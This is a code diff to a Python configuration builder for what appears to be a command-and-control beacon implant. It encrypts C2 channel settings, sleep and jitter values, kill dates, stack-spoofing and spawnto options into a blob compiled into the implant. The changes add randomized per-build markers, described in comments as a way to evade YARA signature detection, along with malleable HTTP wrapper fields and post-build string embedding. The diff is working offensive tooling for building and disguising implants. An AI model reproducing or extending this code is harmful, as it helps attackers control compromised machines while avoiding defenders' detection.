@@ -38,6 +38,9 @@ PCFG_VERSION = 0x0002  # Bumped to v2 for XChaCha20-Poly1305 encryption
 CONFIG_NONCE_SIZE = 24  # XChaCha20 nonce size
 CONFIG_MAC_SIZE = 16    # Poly1305 MAC size
 
+# Post-build append magic (4 bytes, randomized per build to avoid YARA signatures)
+# Format: [MAGIC:4][LEN:4 LE][DATA:N] appended to .exe after build
+
 
 def derive_beacon_id(crypto_key_hex: str) -> str:
     """Derive beacon_id from crypto_key using SHA-256 (first 8 bytes as hex)"""
@@ -67,7 +70,7 @@ def validate_config(config: dict) -> bool:
         print("    pip install jsonschema")
         return False
 
-    schema_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "config", "schema.json")
+    schema_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "Beacon", "config", "schema.json")
     if not os.path.exists(schema_path):
         print(f"[!] Schema file not found: {schema_path}")
         return False
@@ -251,12 +254,12 @@ def build_malleable_block(malleable: dict) -> bytes:
 
     # Build wrapper section
     wrapper = malleable.get('wrapper', {})
-    prefix = wrapper.get('prefix', '').encode('utf-8')[:255]
-    suffix = wrapper.get('suffix', '').encode('utf-8')[:255]
+    prefix = wrapper.get('prefix', '').encode('utf-8')[:65535]
+    suffix = wrapper.get('suffix', '').encode('utf-8')[:65535]
 
-    data += struct.pack('<B', len(prefix))
+    data += struct.pack('<H', len(prefix))
     data += prefix
-    data += struct.pack('<B', len(suffix))
+    data += struct.pack('<H', len(suffix))
     data += suffix
 
     # Build HTTP headers section
@@ -320,16 +323,11 @@ def build_malleable_block(malleable: dict) -> bytes:
     data += struct.pack('<B', len(path_suffix))
     data += path_suffix
 
-    # Body content type - REQUIRED for body type
-    if loc_type == 'body':
-        if 'body_content_type' not in location:
-            raise ValueError("payload_location.body_content_type is required for body type")
-        body_ct = location['body_content_type']
-    else:
-        body_ct = location.get('body_content_type', 'text/plain')
-    body_ct_map = {'text/plain': 0, 'application/octet-stream': 1}
+    # Body content type - ALWAYS written (default text/plain for non-body types)
+    body_ct_map = {"text/plain": 0, "application/octet-stream": 1}
+    body_ct = location.get('body_content_type', 'text/plain')
     if body_ct not in body_ct_map:
-        raise ValueError("body_content_type must be text/plain or application/octet-stream")
+        body_ct = 'text/plain'
     data += struct.pack('<B', body_ct_map[body_ct])
 
     return data
@@ -444,6 +442,10 @@ def build_config_blob(config: dict) -> tuple:
     plaintext += crypto_key  # 32 bytes
     plaintext += struct.pack('<B', len(config['c2_channels']))  # channel_count
     plaintext += c2_data  # Variable length C2 channels
+
+    # Generate build-specific append magic (4 random bytes) for post-build append feature
+    # This allows embedding unencrypted strings/IOCs in the binary without YARA signatures
+    append_magic = get_random_bytes(4)
     plaintext += struct.pack('<I', sleep_ms)  # sleep_ms
     plaintext += struct.pack('<B', jitter_pct)  # jitter_pct
     plaintext += struct.pack('<I', kill_date)  # kill_date (unix timestamp)
@@ -459,6 +461,10 @@ def build_config_blob(config: dict) -> tuple:
     # Read num_spoof_frames from config (default 6 if sleep_stack_spoof is enabled)
     num_spoof_frames = config.get('num_spoof_frames', 6 if config.get('sleep_stack_spoof', False) else 0)
     plaintext += struct.pack('<H', num_spoof_frames)  # num_spoof_frames (2 bytes)
+
+    # Read max_response_size from config (default 64MB)
+    max_response_size = config.get('max_response_size', 67108864)
+    plaintext += struct.pack('<I', max_response_size)  # max_response_size (4 bytes)
 
     # Spawnto configuration: x64_len(1) + x64 + x86_len(1) + x86
     spawnto = config.get('spawnto', {})
@@ -521,6 +527,31 @@ def build_config_blob(config: dict) -> tuple:
         plaintext += struct.pack('<B', len(mod)) + mod
         plaintext += struct.pack('<B', len(fn))  + fn
 
+    # In-memory append strings (encrypted in config blob, available after decryption)
+    # Format: count(1) + for each: len(2) + string
+    im_append_strings = config.get('in_memory_append', {}).get('append', [])
+    plaintext += struct.pack('<B', len(im_append_strings))
+    for s in im_append_strings:
+        if not isinstance(s, str):
+            raise ValueError("in_memory_append.append items must be strings")
+        s_bytes = s.encode('utf-8')
+        if len(s_bytes) > 65535:
+            raise ValueError("in_memory_append.append strings must be <= 65535 bytes")
+        plaintext += struct.pack('<H', len(s_bytes)) + s_bytes
+
+    # Build post-build append data from config (separate from encrypted config)
+    # This creates unencrypted strings appended to the EXE after build
+    append_strings = config.get('post_build', {}).get('append', [])
+    append_data = b''
+    for s in append_strings:
+        if not isinstance(s, str):
+            raise ValueError("post_build.append items must be strings")
+        s_bytes = s.encode('utf-8')
+        if len(s_bytes) > 65535:
+            raise ValueError("post_build.append strings must be <= 65535 bytes")
+        # Format: [MAGIC:4][LEN:4 LE][DATA:N]
+        append_data += append_magic + struct.pack('<I', len(s_bytes)) + s_bytes
+
     # Encrypt payload with XChaCha20-Poly1305 (24-byte nonce)
     cipher = ChaCha20_Poly1305.new(key=config_key, nonce=nonce)
     cipher.update(b'')  # No associated data
@@ -538,10 +569,10 @@ def build_config_blob(config: dict) -> tuple:
     # Complete blob: header + ciphertext + MAC
     blob = header + ciphertext + mac
 
-    return blob, nonce, config_key
+    return blob, nonce, config_key, append_magic, append_data
 
 
-def generate_cpp_header(blob: bytes, output_path: str, nonce: bytes, config_key: bytes, c2_channels: list):
+def generate_cpp_header(blob: bytes, output_path: str, nonce: bytes, config_key: bytes, c2_channels: list, append_magic: bytes):
     """Generate C++ header with embedded encrypted config blob.
 
     Idempotent: only writes to disk if content actually changed, so Make
@@ -563,6 +594,9 @@ def generate_cpp_header(blob: bytes, output_path: str, nonce: bytes, config_key:
     # Format config key as C array
     key_array = ', '.join(f'0x{b:02X}' for b in config_key)
 
+    # Format append magic as C array
+    append_magic_array = ', '.join(f'0x{b:02X}' for b in append_magic)
+
     # Determine enabled transports
     enabled_transports = set()
     for ch in c2_channels:
@@ -582,6 +616,7 @@ def generate_cpp_header(blob: bytes, output_path: str, nonce: bytes, config_key:
 // - Nonce: {CONFIG_NONCE_SIZE} bytes
 // - Key: {len(config_key)} bytes
 // - MAC: {CONFIG_MAC_SIZE} bytes (Poly1305)
+// - Append Magic: 4 bytes (build-specific, for post-build append)
 
 #pragma once
 
@@ -609,6 +644,12 @@ constexpr uint8_t CONFIG_DECRYPT_KEY[{len(config_key)}] = {{
 // XChaCha20 nonce (24 bytes)
 constexpr uint8_t CONFIG_NONCE[{CONFIG_NONCE_SIZE}] = {{
     {nonce_array}
+}};
+
+// Post-build append magic (4 bytes, build-specific)
+// Use with tools/append_data.py to embed unencrypted strings/IOCs
+constexpr uint8_t APPEND_MAGIC[4] = {{
+    {append_magic_array}
 }};
 
 // Helper macro to get header
@@ -663,11 +704,12 @@ def main():
     print("[+] Config validation passed")
 
     # Build blob with XChaCha20-Poly1305 encryption
-    blob, nonce, config_key = build_config_blob(config)
+    blob, nonce, config_key, append_magic, append_data = build_config_blob(config)
     print(f"[+] Built config blob: {len(blob)} bytes")
     print(f"    Encryption: XChaCha20-Poly1305")
     print(f"    Nonce: {nonce.hex()}")
     print(f"    Config Key: {config_key.hex()}")
+    print(f"    Append Magic: {append_magic.hex()}")
 
     # Generate output paths
     config_name = Path(config_path).stem
@@ -678,9 +720,16 @@ def main():
         f.write(blob)
     print(f"[+] Wrote binary blob: {bin_output}")
 
+    # Write post-build append data file (for auto-append during make)
+    if append_data:
+        append_output = os.path.join(output_dir, f"{config_name}_append.bin")
+        with open(append_output, 'wb') as f:
+            f.write(append_data)
+        print(f"[+] Wrote post-build append data: {append_output} ({len(append_data)} bytes, {len(config.get('post_build', {}).get('append', []))} strings)")
+
     # Generate C++ header with encryption key and nonce
     header_output = os.path.join(output_dir, "include", "generated_config.h")
-    generate_cpp_header(blob, header_output, nonce, config_key, config['c2_channels'])
+    generate_cpp_header(blob, header_output, nonce, config_key, config['c2_channels'], append_magic)
 
     # Auto-sync beacon to server's known_beacons.json
     sync_beacon_to_server(config['beacon_id'], config['crypto_key'], config)
@@ -728,7 +777,23 @@ def main():
                 print(f"              path_suffix: {location.get('path_suffix', '')}")
     else:
         print("\nMalleable Config: None (default behavior)")
-    
+
+    # Print post-build append summary
+    post_build = config.get('post_build', {})
+    append_strings = post_build.get('append', [])
+    if append_strings:
+        print("\nPost-Build Append:")
+        for i, s in enumerate(append_strings):
+            print(f"  [{i}] {s!r} ({len(s)} bytes)")
+
+    # Print in-memory append summary
+    im_append = config.get('in_memory_append', {})
+    im_append_strings = im_append.get('append', [])
+    if im_append_strings:
+        print("\nIn-Memory Append (encrypted in config blob):")
+        for i, s in enumerate(im_append_strings):
+            print(f"  [{i}] {s!r} ({len(s)} bytes)")
+
     print("=" * 50)
 
     print("\n[*] Build complete! Compile beacon with: make")
